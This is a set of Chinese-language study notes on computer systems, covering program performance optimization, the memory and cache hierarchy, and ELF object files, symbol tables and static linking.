减少过程调用：减少过程调用有可能会降低程序的模块性和易读性，在确定一定需要这么做的时候，再采取这种行为比较好； 消除不必要的内存引用：从内存是读取数据的代价是很大的，有时候通过增加一个临时变量保存每次循环计算的结果，最后再将其写入内存，可以减少每次循环出现的不必要的内存引用； 理解现代处理器 有两个界限跟处理器的性能有关 延迟界限：指一系列指令的执行需要严格按照顺序，即下一条指令开始之前，当前这条指令必须结束；该界限会限制程序的性能； 吞吐量界限：处理器功能单元的原始计算能力； 乱序设计主要由两个部分组成 指令控制单元：ICU，Instruction Control Unit； 执行单元：EU，Execution Unit； 乱序设计的原理：一次取多条指令，按流水线阶段拆分为多批同类操作，并行处理，通过寄存器重命名机制共享彼此的结果（另一种形式的转发机制），从而能够解决顺序依赖问题； 不同功能单元（例如加法、乘法、除法等算术运算）所需要的时钟周期不同；它包含三个方面的指标，分别为： 延迟：完成运算所需要的总时间； 发射：两个连续的同类型运算之间需要的最小时钟周期数； 容量：能够执行该运算的功能单元数量； 不同操作之间的数据相关，会限制它们的执行顺序，这些限制会形成数据流中的关键路径；但关键路径表示的只是程序所需周期数的下界，还有其他一些因素会限制性能，包括可用的运算单元数量，以及运算单元之间能够传递数据值的数量； 吞吐量是基本的限制，它决定了程序性能的上界；程序优化变换的目标就是尽量接近这个上界； 循环展开 循环展开可以减少循环的迭代次数，但是它并不一定会带来性能的提升，因为单次循环内部的运算次数增加了，所以总的运算次数并没有改变； 当将编译器的优化等级调整到足够高时，编译器都会例行公事的进行循环展开； 提高并行性 虽然硬件中的部分运算单元有多个，但如果程序的每次结算依赖上一条指令的结果，便不能充分利用多个运算单元提高性能；除非拆分成多个累积变量，当然，运算本身要满足结合律和交换律才行； 当将程序变换为 k * k 的循环展开时，就有可能充分提高这种多个运算单元的并行性；当循环展开因子 k &gt;&#x3D; 容量C * 延迟L 时，最有可能保持能够执行该操作的所有功能单元的流水线都是满的； 由于浮点的乘法和加法是不可结合的，因此如果数组中的元素存在某种特殊的不连续性，例如偶数位很大，奇数位很小，那么它就有可能导致在循环展开的计算过程中，出现上溢或下溢；导致循环展开后的计算结果不正确；因此，编译器不会对浮点乘法和加法做这种冒险式的展开，我们需要确定数据连续的情况下，手工完成展开的工作； 另一个提高单次循环内部运算性能的办法是考虑重新结合，例如 (acc * data[i]) * data[i + 1] 变换为 acc * (data[i] * data[i + 1])；因为每次循环的关键点在于 acc 的相关性，在第1种形式中，acc 参与了再次运算，因为在关键路径上面，每次循环有两个 acc 参与的 mul 运算，这样下一个循环需要做出2个周期的等待；而在第2种形式中，acc 在每次循环中只需要参与一次计算，下一个循环只需做出一次等待，因为 data[i] * data[i+1] 的运算在每次循环中是独立的，所以它们是可以并行的，但 acc 则不行； 最后一种提升性能的办法是利用 Intel 处理器的向量指令功能（即 SSE 指令，流SIMD 扩展，最新版本为 AVX） ，它很像 GPU 的做法，通过一条指令，对多个数据进行并行处理；要使用 SSE 指令，貌似需要在源码中按某种形式来编写； 优化合并代码的结果小结：常规优化有可能提升 8-10 倍的性能，而 SIMD 优化则有可能提升 100-200 倍的性能； 一些限制因素 假设运算数量为N，功能单元容量为 C，发射时间为T，则完成所有运算需要的周期为 (N &#x2F; C) * I； 寄存器溢出：虽然使用循环并行多变量累积的方式能够提高性能，但是当需要累积的变量数量超过了可用的寄存器数量时，超出的部分就只能存储到内存中（或者高速缓存中），此时反而会带来性能的下降，这种现象称为寄存器溢出； 分支预测和预测错误处罚 在之前设计的Y86处理器中，对于预测错误的分支，直接抛弃，并载入正确的分支指令重新计算，这会带来惩罚；这种机制称为条件控制转移； 在最新的 x86 设计中，使用同时计算两个分支的指令，然后在条件判断结果出来后，传送其中一个分支的计算结果，这样就避免了错误的时间惩罚，代价是要增加运算单元才行；用空间换时间的思想；这种机制称为条件控制传送； 是否启用条件传送机制，生成相应的机器代码，对于程序员来说不是可控的；但这里面有一些规律可循；通过寻找规律、核对汇编代码、测试性能等实验，可以找到方法；大体规律在于将命令式的代码风格转变为功能式的代码风格，例如 命令式风格 if a[i] &gt; b[i]: tmp &#x3D; a[i]; a[i] &#x3D; b[i]; b[i] &#x3D; tmp; 功能性风格 max &#x3D; a[i] &gt; b[i] ? a[i] : b[i]; min &#x3D; a[i] &gt; b[i] ? b[i] : a[i]; a[i] &#x3D; max; b[i] &#x3D; min; 理解内存性能 加载的性能 现代处理器有专门的功能单元来执行加载和存储操作，这些单元有内部的缓冲区来缓存未完成的操作请求集合；例如 Intel i7 有两个加载单元（每个可缓存72个读请求），一个存储单元（可缓存42个写请求）； 假设有2个加载单元，则对于每个被计算的元素需要加载 k 个值的场景，不可能获得低于 k&#x2F;2 的 CPE； 存储的性能 对于 movq %rax (%rsi) 指令，它实际上是拆分两个指令在执行的，两个指令是独立执行的（当二者指向同一地址时，它们需要有先后顺序，才能完成匹配的工作） 一个是 s_addr 指令，用来计算存储地址，它会在缓冲区创建一个条目，，并且设置该条目的地址字段； 一个是 s_data 指令，用来设置条目的数据字段； 对于内存操作，如果读取和写入的地址不同，它们就可以并行计算；但如果读取和写入是同一个地址，则它们会产生并冲突，需要确定先后执行顺序才能得到正确的结果，因此会增加关键路径上面的节点，增加了更多的时钟周期，从而降低了性能； 应用：性能提高技术 优化程序性能的基本策略 高级设计：选择合适的算法和数据结构；避免使用渐进糟糕性能的算法或编码技术； 基本编码原则： 消除连续的函数调用：如果性能是第一位的，则有时候需要牺牲一下模块性； 消除不必要的内存引用：引入临时变量保存中间结果，只在最后再写入目的位置； 低级优化： 循环展开； 使用多个累积变量和重新结合技术； 用功能性风格重写条件操作，使得编译能够采用条件传送； 确认和消除性能瓶颈 程序剖析 Unix 系统有一个内置工具 GPROF 可以用来做程序剖析，它会产生两种信息 每个函数执行花费的时间； 每个函数被调用的次数； GPROF 使用步骤 编译时加上 -pg 和 -Og 选项，前者用来开启 pg，后者用来指定优化等级，避免 GCC 过度优化改变了原程序的结构；示例：gcc -Og -pg prog.c -o prog 运行时加上 file.txt 参数，示例： .&#x2F;prog file.txt 调用 GPROF 来分析 gmon.out 中的数据，示例：gprof prog GPROF 的原理是利用操作系统的中断机制，并比照中断前后的函数调用情况，来判断函数调用所花费的时间；这种方法非常机智，不过也有缺点： 函数的调用发生在两次调用之间的时候，就不会被统计到；或者函数调用刚好界于上次中断末尾，并结束于下调用开始后不久，则此时计算的时间是按一个中断计算的，有点偏多了；因此，GPROF 对于运行时间很短的程序来说，统计不太精确；但对于运行时间较长的程序来说，它的统计准确； 如果编译器对函数进行内联，则 GPROF 就统计不到了； 默认情况下，不会显示库函数的调用情况； 使用剖析程序来指导优化 选择不同的排序算法之间有巨大的性能差异，例如 Quicksort 的时间复杂度约为 O(nlogn）； 由于链表只能顺序查找，因此链表在头部插入和尾部插入是有区别的；使用尾部插入，使得越经常出现的元素倾向于出现在头部，因此其查找变短，性能越好； 哈希表的桶的数量是一方面的考虑因素，另一方面是需要选择合适的哈希函数，使得样本能够平均分布到各个桶，避免大量的桶空闲； 存储器层次结构 存储技术 随机访问存储器 静态RAM 将每个位存储在一个双稳定特性的存储器单元中；每个单元由6个晶体管组成（因此，相对 DRAM 体积更大，造价更高，功耗也更大） 双稳态：只要通电，就可以永远保持在两个不同电压配置（或状态）之一，其他任何状态都是不稳定的；有点像是一个倒放的钟摆； 静态 RAM 比动态 RAM 的访问速度快，主要用于高速缓存；个人桌面电脑一般只有几 M 的 静态 RAM，但会有几 G 的动态RAM； 动态RAM 将每个位存储为对一个电容的充电；每个单元由一个电容+一个晶体管组成，因此 DRAM 可以制造得非常密集； 电容非常小，约只有30*10-15 法拉； 对干扰非常敏感，甚至光线都会改变它；相机的传感器本质上即是 DRAM 单元的阵列； 在大约10-100毫秒内，电容就会失去电荷；解决方法：通过周期性的读出数据，并重新刷新每个位 处理器的时钟周期以纳秒为单位，所以能够在数据丢失前获取数据； 有些操作系统还会增加纠错码，比如原来64位的字，用72位来编码，多出的8位用来核对数据是否出现错误位） 传统的DRAM 每个 DRAM 单元表示一个位，w 个单元组成一个超单元；多个超单元组成一个芯片单元； 假设一个芯片单元有 d 个超单元，这 d 个超单元会被组成阵列，例如 r 行 c 列，其中 r * c &#x3D; d；这样每个超单元就获得了一个行列表示的地址 假设一个超单元由8个单元组成，即有 8 个位表示，则刚好可以用来存储一个字节的数据； 信息通过引脚(pin)传入和传出；例如可以用2个针脚来传地址，8个针脚来传数据；还有一些针脚用来传输控制信息； 外部先与内存控制器通信，内存控制器再与芯片单元通信； 行列地址不是同时发送的，而是先发放行地址 RAS，再发列地址 CAS；因此，行列使用的是相同的针脚在传送信息； 访问过程： 内存控制器先发行地址，DRAM 芯片将整行的数据复制到内部行缓冲区， 内存控制器再发列地址，DRAM 芯片从内部行缓冲区读出对应的超单元中的内容，发回给内存控制器； 二维阵列的优缺点 优点：行列地址共同一套针脚，减少了针脚的数量； 缺点：数据分两次访问，增加了访问时间； 内存模块 DRAM 芯片封装在内存模块中；内存模块则插在主板上； DIMM：240个针脚的双列直插内存模块，dual inline memory module； 假设内存模块有8个 DRAM 芯片，每个 DRAM 芯片可以存储 8M 字节，则内存模块总共可以存储 8 * 8 &#x3D; 64M 字节； 对于一个64位的信息，它并不是存储在单个 DRAM 芯片中，而是拆分成 8 个字节，分布存储在8 个 DRAM 芯片中，每个芯片存储一个字节，对应一个超单元；（听起来像是分布式存储，哈哈哈哈，其实机械硬盘也是这样的，只是分不同的盘面） 访问的时候，同时访问这 8 个DRAM 芯片的相同行列地址的超单元，各取得一个字节的信息，然后再合并起来，成为8字节64位的信息； 增强的DRAM 快页模式：fast page mode，FPM DRAM 重复利用内部行缓冲区，读取同一行中连续的超单元；以前的四次 RAS&#x2F;CAS 变成一次 RAS + 4次 CAS； 扩展数据输出：EDO DRAM，extended data output； 对 FPM 的增强，允许 CAS 的信号在时间上更紧密一点； 同步 DRAM：SDRAM，synchronous DRAM 常规的、FPM、EDO 等模式下，内存控制器的通信信号是异步的，而 SDRAM 使用同步信号，结果是可以更快的输出数据； 双倍数据速率同步：DDR SDRAM，double data-rate synchronous 对 SDRAM 的一种增强；使用两个时钟沿作为控制信号，从而使 DRAM 的速度翻倍； 不同类型的 DDR 区别在于预取缓冲区的大小不同，2位，4位，8位等； 视频 RAM：VDAM，video RAM 专门用在图形系统的桢缓冲区中；VRAM 允许对内存并行的读和写，从而可以使得写下一次更新的值时，读取缓冲区中的内容刷新屏幕； 非易失性存储器 PROM：可编程 ROM，但只能编程一次； EPROM：可擦写可编程 ROM，可擦写达1000次 EEPROM：电子可擦写可编程 ROM，可擦写10万次； 闪存：基于 EEPROM； 固态硬盘：基于闪存； 访问主存 处理器通过总线访问主存； 访问使用一系列的步骤，总称为总线事务，可分为读事务和写事务两大类； 总线是一组并行的导线，可以携带数据、地址和控制信号； 事实上，CPU 并不是通过总线直连内存模块，而是先经过 I&#x2F;O 桥，即 CPU 通过系统总线连到 I&#x2F;O 桥，I&#x2F;O 桥再通过内存总线连接到内存模块；即它们中间有一个翻译官，这个翻译官负责翻译以不同类型的总线信号；从而让多种类型的硬件设备可以通信； 磁盘存储 磁盘构造 当磁盘有多个盘片时，多个盘片的相同磁道，组成一个柱面； 盘片可以双面存储；每一面由多个呈同心圆的磁道多成； 每个磁道分成相等大小的扇区；每个扇区中间有间隙；间隙不存储数据，而是用来标示磁道的格式化位置； 每个扇区通常存储 512 个字节，也即 4096 位； 盘片以固定的速率旋转；盘片上有磁性材料，用来存放数据； 磁盘容量 容量由两个因素决定 记录密度：磁道上1英寸的段，可以存储的位数； 磁道密度：从盘片中心发出，1英寸半径的段内的磁道数量 面密度 &#x3D; 记录密度 * 磁道密度 磁盘操作 通过读写头来读写磁道上的数据；每个盘面都有一个读写头，但是所有读写头都连接到同一个传动臂上面，因此它们是一致行动的，每次都读写同一个柱面； 这么说来，数据分布存储在相同柱面上，然后读写后再拼接，就跟内存模块中的超单元一样，貌似会更快？ 磁盘以扇区大小的块为单位来读写数据，也即 512 字节为单位； 扇区的访问时间由三部分组成 寻道时间：定位到目标磁道的时间，平均约 3-9ms 旋转时间：定位到目标扇区的时间，平均约为单圈转速时间的一半；对于7200转的磁盘，约为 4ms； 传送时间：跟转速和单个磁道的扇区数量有关；平均约为单圈转速时间除以磁盘扇区数量，约为 0.02 ms； 逻辑磁盘块 磁盘通过抽象一层虚拟的逻辑块系列，与实际的盘面、磁盘、扇区进行映射；简化了操作系统对数据访问；操作系统并不直接盘片打交道，而是发送逻辑块的序号，然后磁盘控制器会翻译成（盘面、磁道、扇区）的三元地址组； 操作系统是如何知道某个数据在磁盘上的逻辑块序号的？这个信息保存在哪里？ 猜测有可能保存在文件的头部信息中，里面存放着一个文件在磁盘中的起始位置，然后当程序通过虚拟地址加载数据时，触发缺页异常，然后根据偏移量，加上磁盘上文件起始位置，得到数据的逻辑块序号； 连接 I&#x2F;O 设备 PCI 总线：外围设备互连总线，Peripheral Component Interconnect，它是一种 I&#x2F;O 总线；这个总线管理各式各样的 I&#x2F;O 设备，包括显卡、监视器、鼠标、键盘等； 其他总线还有 CPU 总线、内存总线；不同总线之间，通过 I&#x2F;O 桥进行互连对接； 有三种类型的设备会连接到 I&#x2F;O 总线 USB：通用串行总线，Universal Serial Bus；它是一个中转机构；各种外围 I&#x2F;O 设备通过它连接到 I&#x2F;O 总线上； 图形卡：它负责代表 CPU 绘制像素并发送给显示器进行显示； 主机总线适配器：负责将磁盘连接到 I&#x2F;O 总线； 早期的 PCI 总线是设备共享的，即一个时刻只能有一台设备访问这些线路；现在则以 PCIe 总线为主流，它的吞吐率达到 16GB&#x2F;s，比如早期 PCI 的 533 MB&#x2F;s 快很多； 访问磁盘 CPU 使用内存映射 I&#x2F;O 的技术，来与 I&#x2F;O 设备进行通信； 例如在一个磁盘读事务中，过程如下 CPU 先给磁盘发出3条指令，包括磁盘读指令及其参数，要读取的磁盘源地址，要存储的目标内存地址； 发完后，由于磁盘要很久后才能干完，CPU 会挂起当前操作，干其他事情去了； 发完这3条指令，到磁盘干完活之间的时间间隔，CPU 差不够可以再处理1600万条指令，所以在 CPU 眼里，磁盘干活的速度像个蜗牛一样； 磁盘接收到这三条指令中，从源地址中取出数据，然后直接存放到目标内存地址中，不需要发给 CPU 进行中转（即 DMA 技术，Direct Memory Access） 磁盘在数据安全存放到内存中以后，会发断一个中断信号给 CPU，告知自己工作已经完成； CPU 收到中断信号后，会停止当前的工作，跳转到此前中断的的工作处，继续完成原来的操作； 固态硬盘 固态硬盘基于闪存技术，其内部其实是对多个闪存芯片的封装，并增加一个翻译层（类似磁盘控制器的角色）； 一个闪存由多个块组成，一个块由 32-128 个页组成，一个页大小一般为 512字节-4KB之间；数据以页为单位进行读写； 对于一个页，只有它所属的块，整个都被擦除了以后，该页才能被写入； 一个块大约在10万次重复写之后，就损坏不能用了； 闪存的实现原理是什么？ 存储技术趋势 存储变得越来越便宜，访问时间变得越来越快； 相对容量成本的变化速度，访问时间的提高速度相对很慢； CPU 与主存之间的速度差距在变大； 局部性 对程序数据引用的局部性 当数据被顺序访问时，它就会呈现出空间局部性； 取指令的局部性 如果指令是被顺序读取的，则具有空间局部性； 如果指令是重复执行的，则具有时间局部性； 局部性小结 重复引用相同变量的程序，具有时间局部性； 对于具有步长为 k 的引用模式的程序，k 越小，程序的空间局部性越好； 对于取指令来说，顺序指令和重复指令分别具有空间和时间上的局部性； 存储器层次结构 存储器结构中的缓存 设计思路：对于每个 k，位于 k 层的存储设备，做为 k + 1 层设备的缓存； 相邻层之间的数据传输使用相同大小的块为单位；不相邻层则块大小可能不同； 当程序需要 k + 1 层的某个数据时，优先从第 k 层开始查找；如果找不到，则意味缓存未命中，然后再到 k + 1 层查找； 这么说，数据的查找是从高到低逐级往下的，而数据的复制貌似则是从低到高逐级往上的？ 最初状态时，缓存是空的，那么此时叫做冷缓存；接下来当出现几次反复访问进行热身后，冷缓存将不会再出现； 为了提高查找的效率，缓存一般采用某种数据放置策略，例如求模策略； 不过这种策略也有弱点，当程序刚好反复访问某个模数相同的块时，则会出现冲突不命中，但实际上缓存是够用的； 当缓存不够大时，则会出现容量不命中；即缓存无法容纳当前反复访问的数据工作集的全部数据； 不同层的缓存，是由不同的硬件或软件来管理的 L0 层，即寄存器，是由编译器来管理的 ； L1~L3 层，即高速缓存，是由硬件来管理的； DRAM 主存：由操作系统和 CPU 上的地址翻译器来共同管理； 本地磁盘：由类似 AFS 或 NFS 这类的分布式文件软件进行管理； 总结：缓存无处不在，由于程序存在空间和时间上的局部性，导致缓存是一种行之有效的策略； 高速缓存存储器 通用的高速缓存存储器组织结构 早期CPU 和 主存之间是直接通信的，后来由于二者的性能差距不断拉大，设计者被迫陆续引入多个高速缓存来做对接； 高速缓存内存的划分方法 分成 s 个组，每组有 e 行，每行有 m 位，其中1个有效位，t 个标记位，s 个索引位，b 个字节位； 有效位仅用来表示块中的数据是否有意义？ 总共存储空间为 &#x3D; s * e * b； t 个标记位是主存地址 m 位的一个子集；所以，给定 m，可以得到 t； s 个索引位也是主存地址 m 位的一个子集，因此给定m ，也可以得到 s； 这么看来，高速缓存的地址空间为 2(t + s) 那么多；但它的空间大小则为 s * e * b； 这里面有一个事情需要特别注意，组数、行数、块数都是实打实的映射，但标记位却没有，也就是说，会有多个相同标记位的地址，共享某组某行，因此，从这里实现了以更小的缓存，映射更大的主存； 当给定一个主存地址时，就可以通过解析地址，找到高速缓存中的映射位置，但如何知道映射位置有值呢？然后正好是想要的值？何时设置有效位？ 首先，假设这个主存地址为 A，它由 m 个位组成，接下来 m 个位将从左到右分成三段，第一段是行的标记位，t 个；第二段是组的索引位，s个；第三段是块的偏移位，b 个；即 m &#x3D; tsb 组成； 通过第 s 组的第 t 行的有效位是否设置为 1 判断是否有效； 通过地址最后 b 个位的值，得到在块中的偏移量，然后去读取相应位置的值即可得到结果； 当数据从主存加载到高速缓存中的时候，就会设置有效位为 1； CPU 需要一个字，但高速缓存从内存中取数据时，会读取并加载一个块的数据，然后再抽取其中的一个字给 CPU； 这样当 CPU 下次读取一个相邻的字时，就很有可能被预加载的块命中； 读取数据三部曲：组选择，行匹配，字选择； 直接映射高速缓存 根据每个组中的高速缓存行数，高速缓存被分为不同的种类；当每组只有一行时，叫做直接映射高速缓存； 块中有 2b 个字节，因此刚好可以放置主存地址最后 b 个位对应的所有数据，当然，需要知道偏移值才能读出来，而这个偏移值，刚好就是地址中 b 位的值； 当数据的长度刚好跟块的长度相同时，有可能会出现数据抖动； 高速缓存使用中间位索引的原因在于，这样可以避开内存上连续数组的数据，被映射到相同的组，导致出现抖动，即每次只有一个组被使用，大幅度降低了使用效率； 组相联高速缓存 一个组中有多行；这样使用是行匹配的时候，需要检查每个行的标记位了，直到找到为止； 看上去好像没有更快，但貌似可以减少抖动的概率； 未命中的时候，如何做行替换？ 最简单粗暴的办法是使用随机替换策略； 高级的策略则统计使用频率，替换低频的行；但这需要增加硬件来实现这种功能，成本上升； 对程序员来说，很难在代码中影响这个策略； 全相联高速缓存 这种结构只有一个组，然后包含所有行； 可是这种样就没有组索引了？那不就跟将索引位放到头部去的效果是一样的？ 而且这样一来，组内的标记位匹配的工作量也非常大，平均每次都需要遍历一半？ 以上问题导致这种全相联的结构，只适合用来做非常小的高速缓存，例如虚拟内存中的翻译备用缓冲器（用来缓存页表项，不懂干嘛的？答：用来翻译虚拟内存地址到物理地址用的） 有关写的问题 两种写策略 马上写：直写，write through，在更新高速缓存后，马上更新它的下一层的副本；缺点：消耗总线流量； 晚点写：写回，write back，尽可能推迟更新的时间点，在需要被覆盖的时候，再写到下一层；优点：总线流量少；缺点：增加了复杂度，需要增多一个位，记录是否当前数据是否被修改过；若未修改，直接写；若已修改，先复制到下一层，然后再写覆盖（有点像海浪一样，由后浪推动前浪向前写回）； 处理写不中的两种策略 写分配：将未命中的快，加载到缓存中，然后更新它；优点：尽量利用空间局部性的程序特点；缺点：消耗流量；（一般和晚点写配合使用） 非写分配：将未命中的块，直到写到下一层中，抛弃对高速缓存的更新；（一般和马上写配合使用） 整体来说，晚点写+写分配是大势所趋；因此随着制造技术的提高，以前的高复杂度变得不再复杂，成本下降，性能提升； 一个真实的高速缓存层次结构的解剖 其实高速缓存分两种，一种用来存指令 i-cache，一种用来存数据 d-cache；这样分开是有道理的，因为指令一般是只读的，如果能够同时提供指令和数据CPU，性能也会更好； 有些高速缓存同时包含指令和数据，称为统一的高速缓存 unified cache； 高速缓存参数的性能影响 想要提高高速缓存的性能，是一项非常精细的工作，它需要对日常常见的大量代码，进行计算的模拟，然后找出最有效的方案； 影响高速缓存性能的参素包括：缓存大小、块大小、相联度、写策略；每一种参数值的选择，都是一把双刃剑，得到的同时，也会失去一些东西； 大缓存命中率高，但跑得慢； 块越大，命中率高，但不命中的惩罚成本也高，因为每次要复制更大的数据； 相联度高，降低了抖动概率，但增加了匹配时间； 写策略：越到低层，越需要使用晚点写，而不是马上写；因为马上写消耗的总线流量多； 编写高速缓存友好的代码 基本原则 让最常见的情况运行得最快； 尽量减小每个循环内部的缓存不命中数量 方法 对局部变量的反复引用是好的； 步长为1的引用模式是好的； 综合：高速缓存对程序性能的影响 存储器山 读取数据的速度，有多种叫法，读吞吐量，或者读带宽；它们都是一回事； 例如 s 秒内，读了 n 个字节，则速度为 n &#x2F; s；一般以 MB&#x2F;s 为单位； 存储系统的性能由多个因素造成，它是一座时间和空间局部性的山；山的上升高度差别可以达到一个数量级； 重新排列循环以提高空间局部性 与内存访问次数相比，不命中率将会是一个更好的性能指标； 通过重新排列循环，提高空间局部性，可以得到很大的性能回报；可达40倍； 在程序中利用局部性 将注意力放在内循环上面，因为大部分内存访问都发生在内循环中，它们对性能的影响最大； 按步长1来顺序读取内存中连续存放的数据； 一旦存储器读入了一段数据，就要尽可能使用它完成所有相关的计算，以增加时间局部性； 链接 概念 链接其实质是将多个代码片段和数据片段组成成为一个单一文件的过程，以便这个单一文件可以被加载到内存中运行； 在以下三个阶段中的任何一个：编译时、加载时、运行时，都有可能发生链接的工作； 链接的好处在于方便让应用程序的代码实现模块化，当某个模块的代码有更新时，只需要重新编译该模块，并重新执行链接的工作，就可以完成整个应用程序的更新，而无需重新编译整个程序的所有模块； 编译器驱动程序 用户通过编译器系统提供的编译器驱动程序，来调用预处理器、编译器、汇编器和链接器； 编译过程 预处理器(cpp)：将源程序文件 main.c 翻译成一个 ASCII 码的中间文件 main.i； 编译器(ccl)：将 main.i 翻译成一个 ASCII 汇编语言文件 main.s； 汇编器(as)：将 main.s 翻译成一个二进制的可重定位目标文件 main.o； 链接器(ld)：将 main.o 以及其他 .o 文件，以及一些必要的系统目标文件合并起来，创建一个可执行目标文件； 静态链接 目标文件由代码和数据节(section) 组成；更通俗的说，目标文件纯粹是字节块的集合，有些块包含程序代码，有些块包含程序数据，而其他块则包含用于引导链接器和加载器的数据结构； 为了构造可执行文件，链接器需要做两个工作 符号解析：每个符号对应一个函数、全局变量或一个静态变量；符号解析的工作，即是将符号引用和符号定义关联起来； 重定位：目标文件里面有很多代码和数据节，链接器将每个符号定义与一个内存位置关联起来，然后再修改符号引用的地方，使它们指向这个内存位置 目标文件中，有各种字节块，链接器的责任，就是为这些块分配新位置，然后修改原位置信息为新分配的位置信息，确保所有的东西能够连接起来； 目标文件 三种形式 可重定位目标文件，relocatable file，由编译器和汇编器生成 可执行目标文件，executable file，由链接器生成； 共享目标文件，shared file，由编译器和汇编器生成 不同操作系统的目标文件格式不太相同 LINUX 使用 ELF 格式，可执行可链接，Executable and Linkable Format； Win 使用 PE 格式，可移植可执行，Portable and Execuable； Mac 使用 Mach-O 格式； 可重定位目标文件：由编译器和汇编器生成 它由以下几部分组成 ELF 头 以16 字节序列开始：包含系统的字大小、字节顺序等信息；（固定长度） 余下部分用于帮助链接器解析目标文件的信息，内容包括 ELF 头的大小（声明了ELF 头的长度，由此知道接下来的第二个节从哪里开始） 目标文件的类型（固定长度） 机器类型（固定长度） 节头部表的偏移量（固定长度，同时声明了节头部表的位置，从这个信息可以找到节头部表） 节头部表中的条目大小和数量；（固定长度，同时声明了节头部表的长度，知道在哪里结束） .text：已编译程序的机器代码（或许可以理解为一堆指令序列？） .rodata：只读数据，例如 printf 语句中的格式串，或者 switch 语句中的跳转表 .data：已初始化的全局变量和静态变量；编译器在 .data 和 .bss 节中，为这些变量分配空间，并在符号表中创建一个有唯一名字的本地链接器符号； .bss：未初始化的静态变量，或者初始化为 0 的全局变量和静态变量（理论上好像应该是空的？虽然没有值，但分配了存储空间） 英文 block storage start，表示块存储的开始，或者应叫 better save space； .symtab：符号表，用来存放在程序中定义和引用的函数和全局变量的信息，但没有局部变量的条目；可以使用 STRIP 命令去掉它； 局部变量在程序运行过程中由栈进行管理，不属于链接器要负责的范围； 符号表实质是一个条目的数组；每个条目由如下字段组成：（如何知道符号表的条目数量？） 1. 1. name 是字符串表中的字节偏移，指向符号的以 NULL 结尾的字符串名字；（这里只能存整数，而不是名字的字符串，这样才能保证固定长度） 2. value 是距定义目标的节的超始位置的偏移；对于可执行文件来说，该值则变成一个绝对地址； 3. binding 表示符号是本地的还是全局的； 4. section 表示该符号属于目标文件的哪个节，它的值是节头部表的索引；有三种类型的伪节，它们在节头部表中没有条目，分别是 1. ABS：代表不该被重定位的符号 2. UNDEF：表示未定义的符号 3. COMMON：表示还未被分配位置的未初始化的数据目标；对于这类型的符号，value 字段的值变成是对齐要求，size 字段的值为最小的大小； 1. COMMON 代表未初始化的全局变量 2. .bss 存放的是未初始化的静态变量，以及初始化为 0 的全局变量和静态变量； 符号表提供了关于符号的丰富的信息，包括该符号定义在哪个节，它在节中的位置（以偏移量计算）、它的名字在字符串表中的位置（以偏移量计算）、符号类型（函数或者数据）； .rel.text：这个节用来存放那些被当前模块引用的外部符号 .text 节中引用的外部符号的列表；当链接器将可重定位目标文件和其他文件组合时，需要修改这个表；以便给每个 .text 节中引用的外部符号分配新位置； 一般来说，任何调用外部函数和引用全局变量的指令，都需要修改位置；引用本地函数的指令则不用修改（本地函数貌似应该在符号表，而不是在 rel.text 表？） 为什么不用？因为本地的函数或指令，是根据本地所在节的偏移量计算的； 注意：可执行目标文件并不需要重定位信息，因此不包含这个节，除非编译的时候，显式通过编译选项指定包含； .rel.data：被模块引用或定义的所有全局变量的重定位信息； 一般来说，任何已经初始化的全局变量，如果它的初始值是一个全局变量地址或者外部定义函数的址，则都需要被修改； .debug，调试符号表 条目包括： 程序中定义的局部变量和类型定义； 程序中定义和引用的全局变量； 原始的 C 源文件； 注：只有使用 -g 选项编译时，才会有这个表； .line：原始 C 源程序中的行号，与 .text 节中机器指令之间的映射；只有使用 -g 选项编译时，才会有这个表； .strtab：字符串表，以 null 结尾的字符串序列，其内容包括 .systab 和 .debug 节中的符号表 节头部中的节名字 节头部表 不同节的位置和大小都是由节头部表描述的; 每个节都有一个固定大小的条目； 由于节的数量和每个节的长度是不固定的，因此只有当节的信息都确认下来后，才有可能生节头部表，因此节头部表只能放在最后；然后在 ELF 头中用偏移量来指向它 好奇每个可重定位目标文件都有上面的这些信息，当它们合并成一个可执行目标文件后，是否上面这些信息大部分都消失了？ 答：会合并不同目标文件中相同节的信息 符号和符号表：包括在目标文件定义和引用的符号的信息； 三种不同的符号 由当前模块定义，并能够被其他模块引用的全局符号，对应于 C 源代码文件中的函数和全局变量； 由其他模块定义，并被当前模块引用的全局符号，也叫外部符号； 只被当前模块定义和引用的局部符号；对应 C 源代码文件中的 static 函数和变量； C 语言中的 static 可以间接的实现 C++ 和 Java 中的 private 功能，保护一些本地变量不被外部访问；多使用这个功能对变量进行保护和隐藏是很好的编程习惯； 符号表是由汇编器基于 .s 文件中的符号构造出来的； .s 文件，是编译过程第二步中，编译器基于 .i 文件生成的； 可重定位目标文件中，.symtab 节中包含 ELF 符号表；这些符号表是一些条目组成的数组； 所谓的条目，其实就是一个结构 struct；struct 中固定的字段，每个字段存储一些相应的信息，包括： name，符号名，不过在条目中存的值并非字符，不然长度不可控，它实际存的是字符串表的偏移值，有点像是一个指针； size，符号大小，单位为字节； type，符号类型，如函数或者数据 binding，符号作用域，如全局或者局部； value，符号地址，如节偏移量，或者绝对地址； section，节头部表的索引下标，每个符号都会分配一个节，并在节头部表中记录，section 即存储着节头部表记录的索引下标值； 莫非遵循如下查找顺序：符号表-&gt;节头部表表-&gt;节？ 有三个特殊的伪节，它们在节头部表中并没有条目， 它们分别是： ABS：代表不该被重位的符号 UNDEF：代表未定义的符号，即本模块中引用，但在其他地方定义的符号；缩写为 UND COMMON：代表未初始化的全局变量 如果它们没在节头部表中，那么如何找到这些伪节呢？ readelf 命令可以用来查看可重定位目标文件内的信息 它使用 Ndx 整数索引值来表示每个节； 符号解析 链接器解析符号的工作原理，是将某个位置的符号引用，与某个模块的符号表中的某个符号定义关联起来； 链接器对模块中局部符号的关联会很简单，因为编译器会为它们生成唯一的名字； 对于全局符号的关联则比较棘手；编译器会假设该全局符号在其他模块中定义，然后为它生成一条链接器符号表条目，之后的事情则交给链接器进行处理；如果链接器在所有模块中都找不到该符号的定义，则会抛出错误，例如 undefined reference to “foo”；也即编译器是不管符号在哪里定义的，它统统假设它们正确定义了，因此在生成目标文件时，编译器是不会报错的； 解析多重定义的全局符号的方法 前提：编译器会为每个符号做上强弱标志，然后汇编器会将强弱信息隐含编码在符号表里面，输出给之后链接器解读； 分类 函数和已定义的全局变量是强符号 未定义的全局变量是弱符号；（这也是编译器将其分类到 COMMON 伪节中的原因，目的在于将处理权交给链接器） 规则 不允许有多个同名的强符号 如果有一个强符号和多弱符号同名，选择强符号； 如果有多个弱符号同名，选择任意一个弱符号； 注意：规则2和规则3会带来不易觉察的错误，即两个模块中定义的同名符号，被模块中的某个函数意外修改，出现了预料之外的行为； 